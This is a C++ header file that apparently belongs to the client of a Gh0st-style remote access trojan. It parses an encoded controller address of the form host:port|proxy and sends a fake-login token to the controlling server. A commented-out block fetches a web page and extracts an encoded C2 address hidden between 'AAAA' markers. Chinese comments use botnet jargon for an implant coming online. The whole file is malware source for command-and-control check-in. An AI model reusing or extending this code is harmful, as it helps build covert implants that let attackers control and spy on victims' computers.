
#if !defined(AFX_LOGIN_H__F0dF68G41_CAAE_4BA1_B6CR_SD8F41E__INCLUDED_)
#define AFX_LOGIN_H__F0dF68G41_CAAE_4BA1_B6CR_SD8F41E__INCLUDED_

#include <wininet.h>
#include <stdlib.h>
#include <vfw.h>

#include "decode.h"
#include "until.h"

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "vfw32.lib")


void SplitLoginInfo(char *lpDecodeString, char **lppszHost, LPDWORD lppPort, char **lppszProxyHost)//, LPDWORD lppProxyPort,
//					char **lppszProxyUser, char **lppszProxyPass)
{
	*lppszHost = NULL;
	*lppPort = 0;
	*lppszProxyHost = NULL;
//	*lppProxyPort = 0;
//	*lppszProxyUser = NULL;
//	*lppszProxyPass = NULL;

	bool	bIsProxyUsed = false;
	bool	bIsAuth = false;
	UINT	nSize = lstrlen(lpDecodeString) + 1;
	char	*lpString = new char[nSize];
	memcpy(lpString, lpDecodeString, nSize);

	char	*pStart, *pNext, *pEnd;
	*lppszHost = lpString;

	if ((pStart = strchr(lpString, ':')) == NULL)
		return;

	*pStart = '\0';
	pStart++;

	if ( (pNext = strchr(pStart, '|')) != NULL )
	{
		*pNext = '\0';
		pNext++;
		*lppszProxyHost = pNext;
	}

	*lppPort = atoi(pStart);
	return;
//	if (!bIsProxyUsed)

/*
	if ((pStart = strchr(pNext, ':')) == NULL)
		return;

	*pStart = '\0';
	if ((pNext = strchr(pStart + 1, '|')) != NULL)
	{
		bIsAuth = true;
		*pNext = '\0';
	}
	*lppProxyPort = atoi(pStart + 1);
	
	if (!bIsAuth)
		return;
	
	pNext++;
	*lppszProxyUser = pNext;
	if ((pStart = strchr(pNext, ':')) == NULL)
		return;
	*pStart = '\0';
	*lppszProxyPass = pStart + 1;
	*/
}

bool getLoginInfo(char *lpURL, char **lppszHost, LPDWORD lppPort, char **lppszProxyHost)//, LPDWORD lppProxyPort,
//				  char **lppszProxyUser, char **lppszProxyPass)
{
	if (lpURL == NULL)
		return false;
//	char	*pStart, *pEnd;
//	char	buffer[2048];
//	char	strEncode[1024];

//	DWORD	dwBytesRead = 0;
//	bool	bRet = false;

	// 没有找到网址，用域名上线
//	if (strstr(lpURL, "http://") == NULL && strstr(lpURL, "https://") == NULL)
//	{
		SplitLoginInfo(lpURL, lppszHost, lppPort, lppszProxyHost);//, lppProxyPort, lppszProxyUser, lppszProxyPass);
		return true;
//	}
/*
	HINTERNET	hNet;
	HINTERNET	hFile;
	hNet = InternetOpen("Mozilla/4.0 (compatible)", INTERNET_OPEN_TYPE_PRECONFIG, NULL, INTERNET_INVALID_PORT_NUMBER, 0);
	
	if (hNet == NULL)
		return bRet;
	hFile = InternetOpenUrl(hNet, lpURL, NULL, 0, INTERNET_FLAG_PRAGMA_NOCACHE | INTERNET_FLAG_RELOAD, 0);
	if (hFile == NULL)
		return bRet;
	
	do
	{
		memset(buffer, 0, sizeof(buffer));
		InternetReadFile(hFile, buffer, sizeof(buffer), &dwBytesRead);
		
		if ((pStart = strstr(buffer, "AAAA")) == NULL) 
			continue;
		pStart += 4;
		if ((pEnd = strstr(pStart, "AAAA")) == NULL)
			continue;

		memset(strEncode, 0, sizeof(strEncode));
		memcpy(strEncode, pStart, pEnd - pStart);

		char *lpDecodeString = MyDecode(strEncode);

		SplitLoginInfo(lpDecodeString, lppszHost, lppPort, lppszProxyHost, lppProxyPort, lppszProxyUser, lppszProxyPass);
		bRet = true;
	} while (dwBytesRead > 0);
	
	InternetCloseHandle(hFile);
	InternetCloseHandle(hNet);
	
	return bRet;
*/
}

int sendLoginInfo_false( CClientSocket *pClient )
{
	// 登录信息
	LOGININFO	LoginInfo;
	memset( &LoginInfo, 0, sizeof(LOGININFO) );
	// 开始构造数据
	LoginInfo.bToken = TOKEN_LOGIN_FALSE; // 令牌为登录，假登陆，需要再验证

	pClient->Send((LPBYTE)&LoginInfo, sizeof(LOGININFO));
	
	return 0;
}

#endif // !defined(AFX_LOGIN_H__F0dF68G41_CAAE_4BA1_B6CR_SD8F41E__INCLUDED_)